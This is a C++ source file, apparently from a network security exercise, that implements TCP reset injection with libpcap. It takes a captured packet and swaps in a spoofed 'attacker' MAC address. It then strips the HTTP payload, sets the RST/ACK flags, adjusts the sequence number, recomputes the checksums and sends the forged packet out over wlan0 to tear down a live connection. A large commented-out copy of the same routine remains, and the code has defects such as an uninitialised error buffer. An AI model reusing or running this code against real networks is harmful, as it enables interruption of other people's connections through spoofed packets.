#include "http_injection.h"
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "mac.h"

#define CARRY 65536

#pragma pack(push,1)
struct Pseudoheader{
    uint32_t srcIP;
    uint32_t destIP;
    uint8_t reserved=0;
    uint8_t protocol;
    uint16_t TCPLen;
};
#pragma pack(pop)
uint16_t calculate(uint16_t* data, int dataLen)
{
    uint16_t result;
    int tempChecksum=0;
    int length;
    bool flag=false;
    if((dataLen%2)==0)
        length=dataLen/2;
    else
    {
        length=(dataLen/2)+1;
        flag=true;
    }
    for (int i = 0; i < length; ++i) // cal 2byte unit
    {


        if(i==length-1&&flag) //last num is odd num
            tempChecksum+=ntohs(data[i]&0x00ff);
        else
            tempChecksum+=ntohs(data[i]);

        if(tempChecksum>CARRY)
                tempChecksum=(tempChecksum-CARRY)+1;
    }
    result=tempChecksum;
    return result;
}
uint16_t calTCPChecksum(const uint8_t *data,int dataLen){
    //make Pseudo Header
    struct Pseudoheader pseudoheader; //saved by network byte order

    //init Pseudoheader
    struct iphdr *iph=(struct iphdr*)data;
    struct tcphdr *tcph=(struct tcphdr*)(data+iph->ihl*4);

    memcpy(&pseudoheader.srcIP,&iph->saddr,sizeof(pseudoheader.srcIP));
    memcpy(&pseudoheader.destIP,&iph->daddr,sizeof(pseudoheader.destIP));
    pseudoheader.protocol=iph->protocol;
    pseudoheader.TCPLen=htons(dataLen-(iph->ihl*4));

    //Cal pseudoChecksum
    uint16_t pseudoResult=calculate((uint16_t*)&pseudoheader,sizeof(pseudoheader));

    //Cal TCP Segement Checksum
    tcph->check=0; //set Checksum field 0
    uint16_t tcpHeaderResult=calculate((uint16_t*)tcph,ntohs(pseudoheader.TCPLen));


    uint16_t checksum;
    int tempCheck;

    if((tempCheck=pseudoResult+tcpHeaderResult)>CARRY)
        checksum=(tempCheck-CARRY) +1;
    else
        checksum=tempCheck;


    checksum=ntohs(checksum^0xffff); //xor checksum
    tcph->check=checksum;

    return checksum;
}
uint16_t calIPChecksum(const uint8_t* data)
{
    struct iphdr* iph=(struct iphdr*)data;
    iph->check=0;//set Checksum field 0

    uint16_t checksum=calculate((uint16_t*)iph,iph->ihl*4);
    iph->check=htons(checksum^0xffff);//xor checksum

    return checksum;
}
bool http_injection(pcap_t *fp,const u_char *pkt_data,int pkt_length){

    struct ether_header *eh;
    struct ip *iph;
    struct tcphdr *tcph;

    eh = (struct ether_header*)pkt_data;

    const char* attacker = "f6:8c:0e:a6:39:b8";
    mac_changer(attacker,eh->ether_shost);

    pkt_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);

    iph->ip_len = htons(iph->ip_hl*4+tcph->doff*4);
    iph->ip_sum = calIPChecksum(pkt_data);

    int jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;

    tcph->th_flags = 0x14;
    tcph->seq = htonl(ntohl(tcph->seq)+(pkt_length-(iph->ip_hl*4+tcph->doff*4)));
    tcph->th_sum = calTCPChecksum(pkt_data,iph->ip_hl*4+tcph->doff*4);

    pkt_data -= sizeof(struct ether_header);
    pkt_length += sizeof(struct ether_header);


/*

    struct ether_header *eh;
    struct ip *iph;
    struct tcphdr *tcph;

    eh = (struct ether_header*)pkt_data;

    const char* attacker = "f6:8c:0e:a6:39:b8";
    mac_changer(attacker,eh->ether_shost);
    pkt_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);

    int jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;

    iph->ip_len = htons(iph->ip_hl*4+tcph->doff*4);
    iph->ip_sum = 0;
    uint16_t ip_checksum=calculate((uint16_t*)iph,iph->ip_hl*4);
    iph->ip_sum=htons(ip_checksum^0xffff);//xor checksum
    tcph->th_flags = 0x14;
    tcph->seq = htonl(ntohl(tcph->seq)+(pkt_length-(iph->ip_hl*4+tcph->doff*4)));

    struct Pseudoheader pseudoheader; //saved by network byte order

    //init Pseudoheader
    memcpy(&pseudoheader.srcIP,&iph->ip_src,sizeof(pseudoheader.srcIP));
    memcpy(&pseudoheader.destIP,&iph->ip_dst,sizeof(pseudoheader.destIP));
    pseudoheader.protocol=iph->ip_p;
    pseudoheader.TCPLen=htons(tcph->doff*4);

    //Cal pseudoChecksum
    uint16_t pseudoResult=calculate((uint16_t*)&pseudoheader,sizeof(pseudoheader));

    //Cal TCP Segement Checksum
    tcph->check=0; //set Checksum field 0
    uint16_t tcpHeaderResult=calculate((uint16_t*)tcph,ntohs(pseudoheader.TCPLen));

    uint16_t checksum;
    int tempCheck;

    if((tempCheck=pseudoResult+tcpHeaderResult)>CARRY)
        checksum=(tempCheck-CARRY) +1;
    else
        checksum=tempCheck;
    checksum=ntohs(checksum^0xffff); //xor checksum
    tcph->check=checksum;

    pkt_data -= sizeof(struct ether_header);
    pkt_length += sizeof(struct ether_header);
*/
    pcap_t *fp2;
    const char* dev = "wlan0";
    char *errbuf;

    if((fp2= pcap_open_live(dev, BUFSIZ, 1 , 1, errbuf)) == NULL)
        {
            fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
            printf("ERROR CODE : %s",errbuf);
        }
    else if(pcap_sendpacket(fp2,pkt_data,jump_pointer))
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        return false;
    }
    else
        return true;
}
